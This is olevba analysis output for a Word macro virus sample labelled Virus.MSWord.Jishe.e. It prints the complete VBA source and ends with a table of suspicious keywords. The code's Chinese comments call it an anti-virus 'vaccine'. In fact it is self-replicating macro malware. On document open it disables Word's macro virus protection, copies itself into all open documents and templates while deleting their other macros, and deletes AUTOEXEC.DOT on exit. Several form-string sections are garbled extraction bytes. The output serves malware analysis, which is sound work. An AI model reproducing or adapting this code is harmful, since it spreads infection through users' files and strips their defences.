olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染
'这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒
'感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力
'与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力
'欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士
'程序设计: 冀慎华
'办公电话:
'伊妹地址: club@263.net
Const answer0 = "FreeWordMacroVirusKiller" '保持与以前版本的兼容性
Const answer1 = "MyMacroVirusKillerV1.0"
Const answer2 = "MyMacroVirusKillerV2.0"
Const answer3 = "MyMacroVirusKillerV2.2" '本程序标志
'Version 2.0
Private Sub Document_Open()
    CloseVirusProtection
    '检查打开的文档中是否有病毒
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染
'这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒
'感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力
'与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力
'欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士
'程序设计: 冀慎华
'办公电话:
'伊妹地址: club@263.net
Option Explicit '程序中的变量必须先定义后使用
Public pVirusReport As String '病毒描述信息
Private Const cMyID As String = "MyMacroVirusKiller" '本程序代码标志
Private Const cMyVersion As String = "V2.2" '本程序版本标准
Private Const cMyModule As String = "JiShenhua" '本程序的模块名称
Private Const cMyUserForm As String = "VirusReport" '本程序的用户窗口名称
Private Const cLinesofThisDocument As Integer = 24 '在ThisDocument模块中全部代码的行数
Private Const cOK As Integer = 0 '一切正常
Private Const cDocHasModuleElse As Integer = 1 '有其他模块存在
Private Const cDocHasCodeElse As Integer = 2 '在ThisDocument模块中有其他代码存在
Private Const cDocHasAllElse As Integer = 3 '在ThisDocument模块中有其他代码存在，并有其他模块存在
Private Const cDocProtected As Integer = 4 '该文档被保护
Private Const cDocHasOldVersion As Integer = 8  '该文档中有旧版本该杀病毒模块
'打开文档时自动执行
Sub AutoOpen()
    CloseVirusProtection
    '检查打开的文档中是否有病毒,如果有病毒，向用户提出报告
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
'新建文档时自动执行
Sub AutoNew()
    CloseVirusProtection
    Infect Word.ActiveDocument
End Sub
'关闭WORD之前清理autoexec.dot文件中的病毒
Sub AutoExit()
    Const AutoDotFile = "C:\AUTOEXEC.DOT"
    If Dir(AutoDotFile) <> "" Then
        Kill AutoDotFile
    End If
End Sub
'从指定文件中向所有打开文档及模板中复制本程序代码及模块
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    '向打开的文档中写入本代码
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    '向WORD模板中写入本代码
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'清除所有打开文档及模板中的病毒模块及代码
Public Function ClearVirus() As Boolean
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean
    
    ClearVirus = True
    '检查所有文档并清除
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "病毒清除工作不成功，请检查原因。", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    '检查所有模板并清除
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "病毒清除工作不成功，请检查原因。", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'检查所有打开的文档及模板中是否有病毒存在，如果有，返回病毒信息描述字符串
Public Function ScanVirus() As Boolean
    Dim Ret As Integer, myDoc As Document, myTemp As Template
    
    ScanVirus = False
    pVirusReport = ""
    '检查所有打开的文档中是否有病毒
    For Each myDoc In Documents
        Ret = ScanDocument(myDoc)
        Select Case Ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse, cDocHasOldVersion
                ScanVirus = True
            Case Else
                MsgBox "函数ScanDocument返回错误代码，系统无法识别。", vbOKOnly, "系统出错"
        End Select
    Next myDoc
    '检查所有模板
    For Each myTemp In Templates
        Ret = ScanDocument(myTemp)
        Select Case Ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse, cDocHasOldVersion
                ScanVirus = True
            Case Else
                MsgBox "函数ScanDocument返回错误代码，系统无法识别。", vbOKOnly, "系统出错"
        End Select
    Next myTemp
End Function
'把本程序代码从一个文件复制到另一个文件中
Private Function Infect(TargetFile) As Boolean
    Dim xItem, myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    '检查参数类型是否正确
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "使用数据类型" & myStr & "调用函数Infect，系统只允许使用Document及Template类型。", vbOKOnly, "系统错误"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function '目标文件与源文件相同时不执行写入操作
    If Infected(TargetFile) Then Exit Function '目标文件已经存在本程序代码
    If TargetFile.VBProject.Protection Then Exit Function '目标文件被保护，不能执行写入操作
    Infect = False
    
    '清除目标文档中已经存在的其他模块及代码
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.codemodule.CountOfLines
            If LinesofCode > 0 Then xItem.codemodule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    '向文档中写入本程序代码及模块
    WordBasic.macrocopy ThisDocument.FullName & ":" & cMyModule, TargetFile.FullName & ":" & cMyModule
    WordBasic.macrocopy ThisDocument.FullName & ":" & cMyUserForm, TargetFile.FullName & ":" & cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '该程序段如果放在前两个语句之前，就会导致VBA32.DLL程序出现致命错误而死机，
    '穷我之毕生编程经验，不知何故，天哪！天理何在？
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).codemodule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).codemodule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).codemodule.InsertLines 1, myStr
    
    Infect = True
End Function
'检查指定文档中是否已经有本程序代码
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim BeInfected As Integer
    Dim myType As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "使用数据类型" & myType & "调用函数Infected，系统只允许使用Document及Template类型。", vbOKOnly, "系统错误"
        Infected = True
        Exit Function
    End If
    
    '检查目标文档是否被保护
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    '当ThisDocument,myModule,myUserForm均存在时，表示该文件已经被感染
    BeInfected = 0
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.codemodule.CountOfLines
            If (LinesofCode > 0) And (xItem.codemodule.Find(cMyID & cMyVersion, 1, 1, 1 + LinesofCode, 1)) Then
                BeInfected = BeInfected Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            BeInfected = BeInfected Or 2
        ElseIf xItem.Name = cMyUserForm Then
            BeInfected = BeInfected Or 4
        End If
    Next xItem
    If BeInfected = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'检查指定的打开文档及模板中是否有病毒存在
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, myStr As String
    Dim LinesofCode As Integer
    
    ScanDocument = cOK
    '检查参数类型是否正确
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "调用函数ScanDocument只能使用Document及Template数据类型。", vbOKOnly, "系统错误"
        Exit Function
    End If
    myStr = myDocOrTemp.Name & "检查结果：" & vbCrLf
    '检查程序模块是否被保护
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr & "  文件中的程序代码被保护，系统无法自动查杀，但也可能存在病毒，请小心！" & vbCrLf
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '此部分有代码时，如果总行数超出了规定的行数或者找不到本模块标志则认定为病毒
            LinesofCode = xItem.codemodule.CountOfLines
            If LinesofCode > 0 Then
                If (LinesofCode > cLinesofThisDocument) Then
                    ScanDocument = ScanDocument Or cDocHasCodeElse
                    myStr = myStr & "  <" & xItem.Name & ">对象中有其他程序存在，大概是病毒。" & vbCrLf
                ElseIf Not xItem.codemodule.Find(cMyID & cMyVersion, 1, 1, 1 + LinesofCode, 1) Then '查找是否有新版本存在
                    If xItem.codemodule.Find(cMyID, 1, 1, 1 + LinesofCode, 1) Then '查找是否有旧版本存在
                        ScanDocument = cDocHasOldVersion
                        myStr = myStr & "  有旧版本杀病毒程序，请选择‘杀之’进行更新。" & vbCrLf
                    Else
                        ScanDocument = ScanDocument Or cDocHasCodeElse
                        myStr = myStr & "  <" & xItem.Name & ">对象中有其他程序存在，大概是病毒。" & vbCrLf
                    End If
                End If
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            '文档中除本模块代码之外，如果还有其它代码则认定为病毒
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr & "  有其他模块<" & xItem.Name & ">存在，极有可能是病毒。" & vbCrLf
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr & "  没有病毒，请放心使用。" & vbCrLf
    pVirusReport = pVirusReport & myStr
End Function
'清除指定的打开文档及模板中的病毒模块及代码
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    
    ClearDocument = False
    '检查参数类型是否正确
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "调用函数ClearDocument只能使用Document及Template数据类型。", vbOKOnly, "系统错误"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    '检查文档是否有病毒并清除
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.codemodule.CountOfLines
                If (LinesofCode > 0) Then
                    xItem.codemodule.DeleteLines 1, LinesofCode
                End If
            Else
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
'关闭Word宏病毒保护功能
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function

-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




















































'窗体程序代码
Option Explicit '程序中的变量必须先定义后使用
'打开窗体时执行的操作
Private Sub UserForm_Initialize()
    CheckBox1.Value = True
    Information.Value = pVirusReport
    Beep
End Sub
'关闭窗体，不作任何处理
Private Sub CommandButtonNothing_Click()
    Dim Ret As Integer
    Ret = MsgBox("领导：" & vbCrLf & "虽然你可能会批评我，但还是要告诉你，这样做是很危险的！" & vbCrLf & "是否真的不做处理，请批示。", vbYesNo + vbDefaultButton2, "特级报告，危险！")
    If Ret = vbYes Then
        Unload Me
    End If
End Sub
'打开VisulBasic编辑器
Private Sub CommandButtonOpenVisubasic_Click()
    ShowVisualBasicEditor = True
End Sub
'杀病毒
Private Sub CommandButtonKill_Click()
    If ClearVirus Then
        ResetMenu
        Unload Me
        MsgBox "按照您的指示，我已经把可能是病毒的东东全部清理完毕，" & vbCrLf & "如果是好心办了坏事，那可不要怪我哟。", vbOKOnly, "报告领导："
    Else
        MsgBox "不知什么原因，清除病毒工作不成功，请您手工检查或与我联系。", vbOKOnly, "冀慎华向您报告："
        Unload Me
    End If
End Sub
'恢复被病毒更改的菜单项
Private Function ResetMenu()
    Dim mItem, cItem, myKey As KeyBinding
    
    CustomizationContext = NormalTemplate
    'Alt+F8:打开宏对话框
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    'Alt+F11:打开VisualBasic编辑器
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyH)).Clear
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyK)).Clear

    '恢复工具菜单的原始设置
    For Each mItem In CommandBars("Tools").Controls
        mItem.Reset
    Next mItem
    For Each cItem In CommandBars("Visual Basic").Controls
        cItem.Reset
    Next cItem
    For Each cItem In CommandBars
        If cItem.Visible = True Then
            cItem.Protection = msoBarNoProtection
        End If
    Next cItem
End Function
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe.e-8cb3a45ea83357fd5a30cf5f1bf97728512b741d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

